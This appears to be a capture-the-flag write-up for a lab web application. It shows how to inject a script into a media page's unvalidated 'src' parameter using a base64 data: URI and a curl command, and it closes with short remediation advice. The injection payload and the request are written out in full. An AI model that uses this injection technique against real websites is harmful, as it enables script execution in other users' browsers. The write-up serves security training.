# XSS Media Tag

In the home page there's only one image with a link to the media page. The media page url accepts a file source as a parameter which isn't validated on the server.

## Steps
* Open your terminal and run:
```bash
	py base64Encode.py "<script>alert('Game Over');</script>" #Outputs PHNjcmlwdD5hbGVydCgnR2FtZSBPdmVyJyk7PC9zY3JpcHQ+ 
```
* Now that we have our malicious content encrypted we can send it, run:
```bash
	curl "http://192.168.56.102/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnR2FtZSBPdmVyJyk7PC9zY3JpcHQ+" | grep "flag"
```

## Ways to secure
* The best way to handle this is to validate and sanitize client input.
* Fetch images from their src directory.
